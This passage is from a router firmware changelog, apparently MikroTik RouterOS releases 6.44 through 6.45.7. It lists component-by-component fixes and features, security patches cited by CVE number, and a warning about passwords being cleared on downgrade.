*) switch - show "external" flag for bridge hosts on MT7621, RTL8367 switch chips;
*) timezone - updated time zone database to version 2019c;
*) tr069-client - added CellDiagnostics parameter support;
*) tr069-client - added LTE band and cellular technology selection parameters;
*) tr069-client - added LTE RSCP, ECNO and ICCID parameter support;
*) tr069-client - added multiple LTE monitoring parameters;
*) tr069-client - reconnect to ACS when "ConnectionRequestURL" is updated;
*) upgrade - improved auto package updating using "check-for-updates";
*) ups - improved compatibility with APC UPS's;
*) usb - general USB modem stability improvements;
*) userman - updated Authorize.Net to use SHA512 hashing;
*) w60g - added "region" setting to limit allowed frequencies (CLI only);
*) w60g - do not reset link when changing comment on station;
*) w60g - fixed "monitor" command on disabled interfaces;
*) w60g - move stations to new bridge when "put-in-bridge" parameter is changed;
*) webfig - fixed link to Winbox download;
*) winbox - added "ip-address" and stats columns in "IP/Kid-Control/Devices" menu;
*) winbox - added "public-address-ipv6" parameter to "IP/Cloud" menu;
*) winbox - added "reset-counters" button to "IP/Kid Control/Devices" menu;
*) winbox - added "tx-info-field" parameter to "Wireless/W60G" menu;
*) winbox - added "Vendor Classes" tab in "IP/DHCP Server" menu;
*) winbox - added wireless alignment LED types to "System/LEDs" menu;
*) winbox - fixed allowed range for bridge filter "new-priority" parameter;
*) winbox - fixed "CAPs Scanner" stopping;
*) winbox - fixed "cluster-id" parameter setting in "Routing/BGP/Instances" menu;
*) winbox - fixed file locking when uploading multiple files at once;
*) winbox - fixed firewall limit parameter support for rates more than 4G;
*) winbox - fixed invalid flag presence in "IP/SMB/Shares" menu;
*) winbox - fixed "Routing" menu icon presence when there is no routing package installed;
*) winbox - improved stability when transfering multiple files between multiple windows;
*) winbox - properly show timestamp in file "Creation Time" field;
*) winbox - removed "Set CA Passphrase" button from "Certificate" menu;
*) winbox - renamed "Queue Limit" to "Queue Size" for "pcq-upload-default" and "pcq-download-default" parameters;
*) winbox - replaced "kb" with "KiB" in "Tools/Packet Sniffer" menu;
*) winbox - show "Switch" menu on RBwAPGR-5HacD2HnD;
*) winbox - show "System/RouterBOARD/Mode Button" on devices that have such feature;
*) wireless - added 4 chain MCS support for 802.11n wireless protocol (CLI only);
*) wireless - added "ETSI" regulatory domain information;
*) wireless - added "indonesia4" regulatory domain information;
*) wireless - added "push-button-5s" value for "wps-mode" parameter;
*) wireless - added U-NII-2 support forRBSXTsqG-5acD, RBLHGG-5acD-XL, RBLHGG-5acD, RBLDFG-5acD, RBDiscG-5acD;
*) wireless - allow using "canada2" regulatory domain on US lock devices;
*) wireless - fixed 802.11n rate selection when managed by CAPsMAN;
*) wireless - fixed RX chain selection;
*) wireless - fixed sensor MAC address reporting in TZSP header;
*) wireless - improved 802.11ac stability for all ARM devices with wireless;
*) wireless - improved IPQ4019, QCA9984, QCA9888 wireless interface stability;
*) wireless - updated "ukraine" regulatory domain information;
*) wireless - updated "united-states" regulatory domain information;

What's new in 6.45.7 (2019-Oct-24 08:44):

MAJOR CHANGES IN v6.45.7:
----------------------
!) lora - added support for LoRaWAN low-power wide-area network technology for MIPSBE, MMIPS and ARM;
!) package - accept only packages with original filenames (CVE-2019-3976);
!) package - improved package signature verification (CVE-2019-3977);
!) security - fixed improper handling of DNS responses (CVE-2019-3978, CVE-2019-3979);
----------------------

Changes in this release:

*) capsman - fixed frequency setting requiring multiple frequencies;
*) capsman - fixed newline character missing on some logging messages;
*) conntrack - properly start manually enabled connection tracking;
*) crs312 - fixed combo SFP port toggling (introduced in v6.44.5);
*) crs3xx - correctly display link rate when 10/100/1000BASE-T SFP modules are used in SFP+ interfaces;
*) crs3xx - fixed management access when using switch rule "new-vlan-priority" property;
*) export - fixed "bootp-support" parameter export;
*) ike2 - fixed phase 1 rekeying (introduced in v6.45);
*) led - fixed default LED configuration for RBLHG5nD;
*) lte - fixed modem not receiving IP configuration when roaming (introduced in v6.45);
*) radius - fixed open socket leak when invalid packet is received (introduced in v6.44);
*) sfp - fixed "sfp-rx-power" value for some transceivers;
*) snmp - improved reliability on SNMP service packet validation;
*) system - improved system stability for devices with AR9342 SoC;
*) winbox - show SFP tab for QSFP interfaces;
*) wireless - added "canada2" regulatory domain information;
*) wireless - improved stability when setting fixed primary and secondary channels on RB4011iGS+5HacQ2HnD-IN;

What's new in 6.45.6 (2019-Sep-10 09:06):

Important note!!!
Due to removal of compatibility with old version passwords in this version, downgrading to any version prior to v6.43 (v6.42.12 and older) will clear all user passwords and allow password-less authentication. Please secure your router after downgrading.
Old API authentication method will also no longer work, see documentation for new login procedure:
https://wiki.mikrotik.com/wiki/Manual:API#Initial_login

*) capsman - fixed regulatory domain information checking when doing background scan;
*) conntrack - improved system stability when using h323 helper (introduced in v6.45);
*) crs3xx - fixed "egress-rate" property on CRS309-1G-8S+, CRS312-4C+8XG, CRS326-24S+2Q+ devices;
*) qsfp - clear SFP monitoring data on port enable;
*) qsfp - correctly display SFP monitoring data;
*) qsfp - fixed EEPROM checksum validation;
*) qsfp - show more QSFP module diagnostics;
*) wireless - include last frequency when manually setting frequency step in "scan-list";

What's new in 6.45.5 (2019-Aug-26 10:56):

Important note!!!
Due to removal of compatibility with old version passwords in this version, downgrading to any version prior to v6.43 (v6.42.12 and older) will clear all user passwords and allow password-less authentication. Please secure your router after downgrading.
Old API authentication method will also no longer work, see documentation for new login procedure:
https://wiki.mikrotik.com/wiki/Manual:API#Initial_login

*) crs328 - adjust fan speed based on SFP and CPU temperature;
*) dhcpv4-server - fixed "Acct-Output-Octets" reporting to RADIUS;
*) health - improved fan control on CRS3xx and CCR1016-12S-1S+r2;
*) ike2 - don't release policy on rekey when child not found;
*) ike2 - fixed ID validation with multiple SAN;
*) ike2 - fixed policy port selection for responder with natted initiator;
*) ike2 - fixed traffic selector address family selection when using IPv6;
*) ike2 - improved rekeying process with Windows initiators;
*) ike2 - properly start all initiators to the same remote address;
*) ipsec - allow inline "passphrase" parameter when importing keys;
*) ipsec - fixed "eap-radius" authentication method (introduced in v6.45);
*) ipsec - fixed minor spelling mistakes in logs;
*) lte - fixed cell information monitoring on R11e-LTE-US (introduced in v6.45.2);
*) lte - fixed LTE interface disappearing on RBSXTLTE3-7;
*) smb - improved stability on x86 and CHR (CVE-2019-16160);
*) snmp - fixed encrypted data sequence (introduced in v6.44.5);
*) ssh - fixed carriage return presence in subsequent sessions;
*) switch - fix port isolation for non-CRS series switch chips;
*) system - accept only valid string for "name" parameter in "disk" menu (CVE-2019-15055);
*) upnp - fixed XML parsing (FG-VD-19-110);
*) watchdog - renamed "no-ping-delay" parameter to "ping-start-after-boot";
*) winbox - added "auto-erase" parameter to "Tools/SMS" menu;
*) winbox - added "https-redirect" parameter to "IP/Hotspot/Profiles menu";
*) winbox - added "revision" parameter to "System/Routerboard" menu;
*) winbox - removed "max-sms" parameter from "Tools/SMS" menu;
*) wireless - fixed basic rate reporting in snooper;

What's new in 6.45.4 (2019-Aug-13 09:04):

(factory only release)

What's new in 6.45.3 (2019-Jul-29 12:11):

Important note!!!
Due to removal of compatibility with old version passwords in this version, downgrading to any version prior to v6.43 (v6.42.12 and older) will clear all user passwords and allow password-less authentication. Please secure your router after downgrading.
Old API authentication method will also no longer work, see documentation for new login procedure:
https://wiki.mikrotik.com/wiki/Manual:API#Initial_login

*) certificate - renew certificates via SCEP when 3/4 of lifetime reached;
*) crs317 - fixed multicast packet receiving (introduced in v6.45);
*) hotspot - fixed default profile values not being used (introduced in v6.45);
*) rb4011 - fixed SFP+ interface linking (introduced in v6.45.2);
*) smips - reduced RouterOS main package size (disabled LTE modem, dot1x and SwOS support);
*) supout - fixed SIM slot printing (introduced in v6.45);
*) wireless - improved U-APSD (WMM Power Save) support for 802.11e;

What's new in 6.45.2 (2019-Jul-17 10:04):

Important note!!!
Due to removal of compatibility with old version passwords in this version, downgrading to any version prior to v6.43 (v6.42.12 and older) will clear all user passwords and allow password-less authentication. Please secure your router after downgrading.
Old API authentication method will also no longer work, see documentation for new login procedure:
https://wiki.mikrotik.com/wiki/Manual:API#Initial_login

*) bonding - fixed bonding running status after reboot when using other bonds as slave interfaces (introduced in v6.45);
*) cloud - properly stop "time-zone-autodetect" after disable;
*) interface - fixed missing PWR-LINE section on PL7411-2nD and PL6411-2nD (introduced v6.44);
*) ipsec - added "connection-mark" parameter for mode-config initiator;
*) ipsec - allow peer argument only for "encrypt" policies (introduced in v6.45);
*) ipsec - fixed peer configuration migration from versions older than v6.43 (introduced in v6.45);
*) ipsec - improved stability for peer initialization (introduced in v6.45);
*) ipsec - show warning for policies with "unknown" peer;
*) ospf - fixed possible busy loop condition when accessing OSPF LSAs;
*) profile - added "internet-detect" process classificator;
*) radius - fixed "User-Password" encoding (introduced in v6.45);
*) ssh - do not enable "none-crypto" if "strong-crypto" is enabled on upgrade (introduced in v6.45);
*) ssh - fixed executed command output printing (introduced in v6.45);
*) supout - fixed supout file generation outside of internal storage with insufficient space;
*) upgrade - fixed "auto-upgrade" to use new style authentication (introduced in v6.45);
*) vlan - fixed "slave" flag for non-running interfaces (introduced in v6.45);
*) wireless - improved 802.11ac stability for all ARM devices with wireless;
*) wireless - improved range selection when distance set to "dynamic";

What's new in 6.45.1 (2019-Jun-27 10:23):

Important note!!!
Due to removal of compatibility with old version passwords in this version, downgrading to any version prior to v6.43 (v6.42.12 and older) will clear all user passwords and allow password-less authentication. Please secure your router after downgrading.
Old API authentication method will also no longer work, see documentation for new login procedure:
https://wiki.mikrotik.com/wiki/Manual:API#Initial_login

MAJOR CHANGES IN v6.45.1:
----------------------
!) dot1x - added support for IEEE 802.1X Port-Based Network Access Control;
!) ike2 - added support for EAP authentication methods (eap-tls, eap-ttls, eap-peap, eap-mschapv2) as initiator;
!) security - fixed vulnerabilities CVE-2019-13954, CVE-2019-13955;
!) security - fixed vulnerabilities CVE-2019-11477, CVE-2019-11478, CVE-2019-11479;
!) security - fixed vulnerability CVE-2019-13074;
!) user - removed insecure password storage;
----------------------

Changes in this release:

*) bridge - correctly display bridge FastPath status when vlan-filtering or dhcp-snooping is used;
*) bridge - correctly handle bridge host table;
*) bridge - fixed log message when hardware offloading is being enabled;
*) bridge - improved stability when receiving traffic over USB modem with bridge firewall enabled;
*) capsman - fixed CAP system upgrading process for MMIPS;
*) capsman - fixed interface-list usage in access list;
*) ccr - improved packet processing after overloading interface;
*) certificate - added "key-type" field;
*) certificate - added support for ECDSA certificates (prime256v1, secp384r1, secp521r1);
*) certificate - fixed self signed CA certificate handling by SCEP client;
*) certificate - made RAM the default CRL storage location;
*) certificate - removed DSA (D) flag;
*) certificate - removed "set-ca-passphrase" parameter;
*) chr - legacy adapters require "disable-running-check=yes" to be set;
*) cloud - added "replace" parameter for backup "upload-file" command;
*) conntrack - fixed GRE protocol packet connection-state matching (CVE-2014-8160);
*) conntrack - significant stability and performance improvements;
*) crs317 - fixed known multicast flooding to the CPU;
*) crs3xx - added ethernet tx-drop counter;
*) crs3xx - correctly display auto-negotiation information for SFP/SFP+ interfaces in 1Gbps rate;
*) crs3xx - fixed auto negotiation when 2-pair twisted cable is used (downshift feature);
*) crs3xx - fixed "tx-drop" counter;
*) crs3xx - improved switch-chip resource allocation on CRS326, CRS328, CRS305;
*) defconf - added "custom-script" field that prints custom configuration installed by Netinstall;
*) defconf - automatically set "installation" parameter for outdoor devices;
*) defconf - changed default configuration type to AP for cAP series devices;
*) defconf - fixed channel width selection for RU locked devices;
*) dhcp - create dual stack queue based on limitations specified on DHCPv4 server lease configuration;
*) dhcp - do not require lease and binding to have the same configuration for dual-stack queues;
*) dhcp - show warning in log if lease and binding dual-stack related parameters do not match and create separate queues;
*) dhcpv4-server - added "client-mac-limit" parameter;
*) dhcpv4-server - added IP conflict logging;
*) dhcpv4-server - added RADIUS accounting support with queue based statistics;
*) dhcpv4-server - added "vendor-class-id" matcher (CLI only);
*) dhcpv4-server - improved stability when performing "check-status" command;
*) dhcpv4-server - replaced "busy" lease status with "conflict" and "declined";
*) dhcpv6-client - added option to disable rapid-commit;
*) dhcpv6-client - fixed status update when leaving "bound" state;
*) dhcpv6-server - added additional RADIUS parameters for Prefix delegation, "rate-limit" and "life-time";
*) dhcpv6-server - added "address-list" support for bindings;
*) dhcpv6-server - added "insert-queue-before" and "parent-queue" parameters;
*) dhcpv6-server - added RADIUS accounting support with queue based statistics;
*) dhcpv6-server - added "route-distance" parameter;
*) dhcpv6-server - fixed dynamic IPv6 binding without proper reference to the server;
*) dhcpv6-server - override prefix pool and/or DNS server settings by values received from RADIUS;
*) discovery - correctly create neighbors from VLAN tagged discovery messages;
*) discovery - fixed CDP packets not including address on slave ports (introduced in v6.44);
*) discovery - improved neighbour's MAC address detection;
*) discovery - limit max neighbour count per interface based on total RAM memory;
*) discovery - show neighbors on actual mesh ports;
*) e-mail - include "message-id" identification field in e-mail header;
*) e-mail - properly release e-mail sending session if the server's domain name can not be resolved;
*) ethernet - added support for 25Gbps and 40Gbps rates;
*) ethernet - fixed running (R) flag not present on x86 interfaces and CHR legacy adapters;
*) ethernet - increased loop warning threshold to 5 packets per second;
*) fetch - added SFTP support;
*) fetch - improved user policy lookup;
*) firewall - fixed fragmented packet processing when only RAW firewall is configured;
*) firewall - process packets by firewall when accepted by RAW with disabled connection tracking;
*) gps - fixed missing minus close to zero coordinates in dd format;
*) gps - make sure "direction" parameter is upper case;
*) gps - strip unnecessary trailing characters from "longtitude" and "latitude" values;
*) gps - use "serial0" as default port on LtAP mini;
*) hotspot - added "interface-mac" variable to HTML pages;
*) hotspot - moved "title" HTML tag after "meta" tags;
*) ike1 - adjusted debug packet logging topics;
*) ike2 - added support for ECDSA certificate authentication (rfc4754);
*) ike2 - added support for IKE SA rekeying for initiator;
*) ike2 - do not send "User-Name" attribute to RADIUS server if not provided;
*) ike2 - improved certificate verification when multiple CA certificates received from responder;
*) ike2 - improved child SA rekeying process;
*) ike2 - improved XAuth identity conversion on upgrade;
*) ike2 - prefer SAN instead of DN from certificate for ID payload;
*) ippool - improved logging for IPv6 Pool when prefix is already in use;
*) ipsec - added dynamic comment field for "active-peers" menu inherited from identity;
*) ipsec - added "ph2-total" counter to "active-peers" menu;
*) ipsec - added support for RADIUS accounting for "eap-radius" and "pre-shared-key-xauth" authentication methods;
*) ipsec - added traffic statistics to "active-peers" menu;
*) ipsec - disallow setting "src-address" and "dst-address" for transport mode policies;
*) ipsec - do not allow adding identity to a dynamic peer;
*) ipsec - fixed policies becoming invalid after changing priority;
*) ipsec - general improvements in policy handling;
*) ipsec - properly drop already established tunnel when address change detected;
*) ipsec - renamed "remote-peers" to "active-peers";
*) ipsec - renamed "rsa-signature" authentication method to "digital-signature";
*) ipsec - replaced policy SA address parameters with peer setting;
*) ipsec - use tunnel name for dynamic IPsec peer name;
*) ipv6 - improved system stability when receiving bogus packets;
*) ltap - renamed SIM slots "up" and "down" to "2" and "3";
*) lte - added initial support for Vodafone R216-Z;
*) lte - added passthrough interface subnet selection;
*) lte - added support for manual operator selection;
*) lte - allow setting empty APN;
*) lte - allow to specify URL for firmware upgrade "firmware-file" parameter;
*) lte - do not show error message for info commands that are not supported;
*) lte - fixed session reactivation on R11e-LTE in UMTS mode;
*) lte - improved firmware upgrade process;
*) lte - improved "info" command query;
*) lte - improved R11e-4G modem operation;
*) lte - renamed firmware upgrade "path" command to "firmware-file" (CLI only);
*) lte - show alphanumeric value for operator info;
*) lte - show correct firmware revision after firmware upgrade;
*) lte - use default APN name "internet" when not provided;
*) lte - use secondary DNS for DNS server configuration;
*) m33g - added support for additional Serial Console port on GPIO headers;
*) ospf - added support for link scope opaque LSAs (Type 9) for OSPFv2;
*) ospf - fixed opaque LSA type checking in OSPFv2;
*) ospf - improved "unknown" LSA handling in OSPFv3;
*) ovpn - added "verify-server-certificate" parameter for OVPN client (CVE-2018-10066);
*) ppp - added initial support for Quectel BG96;
*) proxy - increased minimal free RAM that can not be used for proxy services;
*) rb3011 - improved system stability when receiving bogus packets;
*) rb4011 - fixed MAC address duplication between sfp-sfpplus1 and wlan1 interfaces (wlan1 configuration reset required);
*) rb921 - improved system stability ("/system routerboard upgrade" required);
*) routerboard - renamed 'sim' menu to 'modem';
*) sfp - fixed S-35LC20D transceiver DDMI readouts after reboot;
*) sms - added USSD message functionality under "/tool sms" (CLI only);
*) sms - allow specifying multiple "allowed-number" values;
*) sms - improved delivery report logging;
*) snmp - added "dot1dStpPortTable" OID;
*) snmp - added OID for neighbor "interface";
*) snmp - added "write-access" column to community print;
*) snmp - allow setting interface "adminStatus";
*) snmp - fixed "send-trap" not working when "trap-generators" does not contain "temp-exception";
*) snmp - fixed "send-trap" with multiple "trap-targets";
*) snmp - improved reliability on SNMP service packet validation;
*) snmp - properly return multicast and broadcast packet counters for IF-MIB OIDs;
*) ssh - accept remote forwarding requests with empty hostnames;
*) ssh - added new "ssh-exec" command for non-interactive command execution;
*) ssh - fixed non-interactive multiple command execution;
*) ssh - improved remote forwarding handling (introduced in v6.44.3);
*) ssh - improved session rekeying process on exchanged data size threshold;
*) ssh - keep host keys when resetting configuration with "keep-users=yes";
*) ssh - use correct user when "output-to-file" parameter is used;
*) sstp - improved stability when received traffic hits tarpit firewall;
*) supout - added IPv6 ND section to supout file;
*) supout - added "kid-control devices" section to supout file;
*) supout - added "pwr-line" section to supout file;
*) supout - changed IPv6 pool section to output detailed print;
*) switch - properly reapply settings after switch chip reset;
*) tftp - added "max-block-size" parameter under TFTP "settings" menu (CLI only);
*) tile - improved link fault detection on SFP+ ports;
*) tr069-client - added LTE CQI and IMSI parameter support;
*) tr069-client - fixed potential memory corruption;
*) tr069-client - improved error reporting with incorrect firware upgrade XML file;
*) traceroute - improved stability when sending large ping amounts;
*) traffic-generator - improved stability when stopping traffic generator;
*) tunnel - removed "local-address" requirement when "ipsec-secret" is used;
*) userman - added support for "Delegated-IPv6-Pool" and "DNS-Server-IPv6-Address" (CLI only);
*) w60g - do not show unused "dmg" parameter;
*) w60g - prefer AP with strongest signal when multiple APs with same SSID present;
*) w60g - show running frequency under "monitor" command;
*) winbox - added "System/SwOS" menu for all dual-boot devices;
*) winbox - do not allow setting "dns-lookup-interval" to "0";
*) winbox - show "LCD" menu only on boards that have LCD screen;
*) wireless - fixed frequency duplication in the frequency selection menu;
*) wireless - fixed incorrect IP header for RADIUS accounting packet;
*) wireless - improved 160MHz channel width stability on rb4011;
*) wireless - improved DFS radar detection when using non-ETSI regulated country;
*) wireless - improved installation mode selection for wireless outdoor equipment;
*) wireless - set default SSID and supplicant-identity the same as router's identity;
*) wireless - updated "china" regulatory domain information;
*) wireless - updated "new zealand" regulatory domain information;
*) www - improved client-initiated renegotiation within the SSL and TLS protocols (CVE-2011-1473);

What's new in 6.45 (2019-Jun-21 09:00):

(factory only release)

What's new in 6.44.4 (2019-May-09 12:14):

(factory only release)

What's new in 6.44.3 (2019-Apr-23 12:37):

*) certificate - fixed SAN being duplicated on status change (introduced in v6.44);
*) conntrack - fixed "loose-tcp-tracking" parameter not taken in action (introduced in v6.44);
*) dhcpv4-server - fixed commenting option for alerts;
*) dhcpv6-server - fixed binding setting update from RADIUS;
*) ike1 - improved stability for transport mode policies on initiator side;
*) ipsec - fixed freshly created identity not taken in action (introduced in v6.44);
*) ipsec - fixed possible configuration corruption after import (introduced in v6.44);
*) ipv6 - adjusted IPv6 route cache max size;
*) ipv6 - improved IPv6 neighbor table updating process;
*) lte - reset LTE modem only when SIM slot is changed on dual SIM slot devices;
*) rb2011 - removed "sfp-led" from "System/LEDs" menu;
*) smb - fixed possible buffer overflow;
*) snmp - added "radio-name" (mtxrWlRtabRadioName) OID support;
*) ssh - added "both", "local" and "remote" options for "forwarding-enabled" parameter;
*) ssh - do not generate host key on configuration export;
*) ssh - fixed multiline non-interactive command execution;
*) switch - fixed possible crash when interface state changes and DHCP Snooping is enabled;
*) userman - updated authorize.net gateway DNS name;
*) wireless - added support for US FCC UNII-2 and Canada country profiles for LHG-5HPnD-US, RBLHG-5HPnD-XL-US and SXTsq5HPnD-US devices;
*) wireless - improved wireless country settings for EU countries;

What's new in 6.44.2 (2019-Apr-01 12:47):

MAJOR CHANGES IN v6.44.2:
----------------------
!) ipv6 - fixed soft lockup when forwarding IPv6 packets;
!) ipv6 - fixed soft lockup when processing large IPv6 Neighbor table;
----------------------

Changes in this release:

*) ipv6 - adjust IPv6 route cache max size based on total RAM memory;

What's new in 6.44.1 (2019-Mar-13 08:38):

Changes in this release:

*) bridge - fixed possible memory leak when using "ingress-filtering=yes" on bridge interface;
*) certificate - force 3DES encryption for P12 certificate export;
*) dhcp - fixed dual stack queue addition;
*) dhcpv6-server - use MAC address for RADIUS user when "allow-dual-stack-queue=yes";
*) e-mail - fixed missing "from" address for sent e-mails (introduced in v6.44);
*) gps - increase precision for dd format;
*) gps - removed unnecessary leading "0" for dd format;
*) ipsec - allow identities with empty XAuth login and password if RADIUS is enabled (introduced in v6.44);
*) ipsec - fixed dynamic L2TP peer and identity configuration missing after reboot (introduced in v6.44);
*) ipsec - use "remote-id=ignore" for dynamic L2TP configuration (introduced in v6.44);
*) ipv6 - do not allow setting "preferred-lifetime" longer than "valid-lifetime";
*) lte - do not show "session-uptime" if session is not up;
*) lte - fixed LTE interface band setting on RBSXTLTE3-7 (introduced in v6.44);
*) rb4011 - fixed ether10 failing to auto negotiate link speed to 1Gbps;
*) winbox - added "use-local-address" parameter in "IP/Cloud" menu;
*) wireless - fixed antenna gain setting on RBSXT5nDr2;

What's new in 6.44 (2019-Feb-25 14:11):

MAJOR CHANGES IN v6.44:
----------------------
!) cloud - added command "/system backup cloud" for backup storing on cloud (CLI only);
!) ipsec - added new "identity" menu with common peer distinguishers;
!) ipsec - removed "main-l2tp" exchange-mode, it is the same as "main" exchange-mode;
!) ipsec - removed "users" menu, XAuth user configuration is now handled by "identity" menu;
!) radius - initial implementation of RadSec (RADIUS communication over TLS);
!) speedtest - added "/tool speed-test" for ping latency, jitter, loss and TCP and UDP download, upload speed measurements (CLI only);
----------------------

Changes in this release:

*) bgp - properly update keepalive time after peer restart;
*) bridge - added option to monitor fast-forward status;
*) bridge - count routed FastPath packets between bridge ports under FastPath bridge statistics;
*) bridge - disable fast-forward when using SlowPath features;
*) bridge - fixed BOOTP packet forwarding when DHCP Snooping is enabled;
*) bridge - fixed DHCP Option 82 parsing when using DHCP Snooping;
*) bridge - fixed log message when hardware offloading is being enabled;
*) bridge - fixed packet forwarding when changing MSTI VLAN mappings;
*) bridge - fixed packet forwarding with enabled DHCP Snooping and Option 82;
*) bridge - fixed possible memory leak when using MSTP;
*) bridge - fixed system's identity change when DHCP Snooping is enabled (introduced in v6.43);
*) bridge - improved packet handling when hardware offloading is being disabled;
*) bridge - improved packet processing when bridge port changes states;
*) btest - added multithreading support for both UDP and TCP tests;
*) btest - added warning message when CPU load exceeds 90% (CLI only);
*) capsman - always accept connections from loopback address;
*) certificate - added support for multiple "Subject Alt. Names";
*) certificate - enabled RC2 cipher to allow P12 certificate decryption;
*) certificate - fixed certificate signing by SCEP client if multiple CA certificates are provided;
*) certificate - show digest algorithm used in signature;
*) chr - assign interface names based on underlying PCI device order on KVM;
*) chr - distribute NIC queue IRQ's evenly across all CPUs;
*) chr - fixed IRQ balancing when using more than 32 CPUs;
*) chr - improved system stability when insufficient resources are allocated to the guest;
*) cloud - added "ddns-update-interval" parameter;
*) cloud - do not reuse old UDP socket if routing changes are detected;
*) cloud - ignore "force-update" command if DDNS is disabled;
*) cloud - improved DDNS service disabling;
*) cloud - made address updating faster when new public address detected;
*) conntrack - added new "loose-tcp-tracking" parameter (equivalent to "nf_conntrack_tcp_loose" in netfilter);
*) console - renamed IP protocol 41 to "ipv6-encap";
*) console - updated copyright notice;
*) crs317 - fixed packet forwarding when LACP is used with hw=no;
*) crs3xx - fixed packet forwarding through SFP+ ports when using 100Mbps link speed;
*) crs3xx - improved fan control stability;
*) defconf - fixed configuration not generating properly on upgrade;
*) defconf - fixed default configuration loading on RB4011iGS+5HacQ2HnD-IN;
*) defconf - fixed IPv6 link-local address range in firewall rules;
*) dhcp - added "allow-dual-stack-queue" setting for IPv4/IPv6 DHCP servers to control dynamic lease/binding behaviour;
*) dhcp - properly load DHCP configuration if options are configured;
*) dhcpv4-server - added "parent-queue" parameter (CLI only);
*) dhcpv4-server - added "User-Name" attribute to RADIUS accounting messages;
*) dhcpv4-server - fixed service becoming unresponsive after interface leaves and enters the same bridge;
*) dhcpv4-server - use ARP for conflict detection;
*) dhcpv6-client - use default route distance also for unreachable route added by DHCPv6 client;
*) dhcpv6-server - allow to add DHCPv6 server with pool that does not exist;
*) dhcpv6-server - fixed missing gateway for binding's network if RADIUS authentication was used;
*) dhcpv6-server - improved DHCPv6 server stability when using "print" command;
*) dhcpv6-server - show "client-address" parameter for bindings;
*) discovery - detect proper slave interface on bounded interfaces;
*) discovery - fixed malformed neighbor information for routers that has incomplete IPv6 configuration;
*) discovery - send master port in "interface-name" parameter;
*) discovery - show neighbors on actual bridge port instead of bridge itself for LLDP;
*) e-mail - added info log message when e-mail is sent successfully;
*) e-mail - added support for multiple transactions on single connection;
*) ethernet - added "tx-rx-1024-max" counter to Ethernet stats;
*) ethernet - fixed IPv4 and IPv6 packet forwarding on IPQ4018 devices;
*) ethernet - fixed linking issues on wAP ac, RB750Gr2 and Metal 52 ac (introduced in v6.43rc52);
*) ethernet - fixed packet forwarding when SFP interface is disabled on hEX S;
*) ethernet - fixed VLAN1 forwarding on RB1100AHx4 and RB4011 devices;
*) ethernet - improved per core ethernet traffic classificator on mmips devices;
*) export - fixed "silent-boot" compact export;
*) fetch - added "http-header-field" parameter;
*) fetch - added option to specify multiple headers under "http-header-field", including content type;
*) fetch - fixed "without-paging" option;
*) fetch - improved file downloading to slow memory;
*) fetch - improved stability when using HTTP mode;
*) fetch - removed "http-content-type" parameter;
*) gps - increase precision for dd format;
*) gps - moved "coordinate-format" from "monitor" command to "set" parameter;
*) health - improved fan control stability on CRS328-24P-4S+RM;
*) hotspot - added "https-redirect" under server profiles;
*) hotspot - added per-user NAT rule generation based on "incoming-filter" and "outgoing-filter" parameters;
*) ike1 - do not allow using RSA-key and RSA-signature authentication methods simultaneously on single peer;
*) ike1 - fixed memory leak;
*) ike2 - added option to specify certificate chain;
*) ike2 - added peer identity validation for RSA auth (disabled after upgrade);
*) ike2 - allow to match responder peer by "my-id=fqdn" field;
*) ike2 - fixed local address lookup when initiating new connection;
*) ike2 - improved subsequent phase 2 initialization when no childs exist;
*) ike2 - properly handle certificates with empty "Subject";
*) ike2 - retry RSA signature validation with deduced digest from certificate;
*) ike2 - send split networks over DHCP (option 249) to Windows initiators if DHCP Inform is received;
*) ike2 - show weak pre-shared-key warning;
*) interface - added "pwr-line" interface support (more information will follow in next newsletter);
*) ipsec - added account log message when user is successfully authenticated;
*) ipsec - added basic pre-shared-key strength checks;
*) ipsec - added new "remote-id" peer matcher;
*) ipsec - allow to specify single address instead of IP pool under "mode-config";
*) ipsec - fixed active connection killing when changing peer configuration;
*) ipsec - fixed all policies not getting installed after startup (introduced in v6.43.8);
*) ipsec - fixed stability issues after changing peer configuration (introduced in v6.43);
*) ipsec - hide empty prefixes on "peer" menu;
*) ipsec - improved invalid policy handling when a valid policy is uninstalled;
*) ipsec - made dynamic "src-nat" rule more specific;
*) ipsec - made peers autosort themselves based on reachability status;
*) ipsec - moved "profile" menu outside "peer" menu;
*) ipsec - properly detect AES-NI extension as hardware AEAD;
*) ipsec - removed limitation that allowed only single "auth-method" with the same "exchange-mode" as responder;
*) ipsec - require write policy for key generation;
*) kidcontrol - added IPv6 support;
*) kidcontrol - added "reset-counters" command for "device" menu (CLI only);
*) kidcontrol - added statistics web interface for kids (http://router.lan/kid-control);
*) kidcontrol - added "tur-fri", "tur-mon", "tur-sat", "tur-sun", "tur-thu", "tur-tue", "tur-wed" parameters;
*) kidcontrol - dynamically discover devices from DNS activity;
*) kidcontrol - fixed validation checks for time intervals;
*) kidcontrol - properly detect time zone changes;
*) kidcontrol - use "/128" prefix-length for IPv6 addresses;
*) l2tp - fixed IPsec secret not being updated when "ipsec-secret" is changed under L2TP client configuration;
*) lcd - made "pin" parameter sensitive;
*) led - fixed default LED configuration for RBSXTsq-60ad;
*) led - fixed default LED configuration for wAP 60G AP devices;
*) led - fixed PWR-LINE AP Ethernet LED polarity ("/system routerboard upgrade" required);
*) lldp - fixed missing capabilities fields on some devices;
*) log - accumulate multiple e-mail messages before sending;
*) lte - added additional ID support for Novatel USB730L modem;
*) lte - added "cell-monitor" command for R11e-LTE international modem (CLI only);
*) lte - added "ecno" field for "info" command;
*) lte - added "firmware-upgrade" command for R11e-LTE international modems (CLI only);
*) lte - added initial support for multiple APN for R11e-4G (new modem firmware required);
*) lte - added initial support for Telit LN940;
*) lte - added multiple APN support for R11e-4G;
*) lte - added option to lock the LTE operator;
*) lte - added support for JioFi JMR1040 modem;
*) lte - fixed connection issue when LTE modem was de-registered from network for more than 1 minute;
*) lte - fixed DHCP IP acquire (introduced in v6.43.7);
*) lte - fixed DHCP relay packet forwarding when in passthrough mode;
*) lte - fixed IPv6 activation for R11e-LTE-US modems;
*) lte - fixed Jaton/SQN modems preventing router from booting properly;
*) lte - fixed LTE interface not working properly after reboot on RBSXTLTE3-7;
*) lte - fixed missing running (R) flag for Jaton LTE modems;
*) lte - fixed passthrough DHCP address forward when other address is acquired from operator;
*) lte - fixed reported "rsrq" precision (introduced in v6.43.8);
*) lte - improved compatibility for Alt38xx modems;
*) lte - improved SIM7600 initialization after reset;
*) lte - improved SimCom 7100e support;
*) lte - query "cfun" on initialization;
*) lte - require write policy for at-chat;
*) lte - update firmware version information after R11e-LTE/R11e-4G firmware upgrade;
*) netinstall - do not show kernel failure critical messages in the log after fresh install;
*) ntp-client - fixed "dst-active" and "gmt-offset" being updated after synchronization with server;
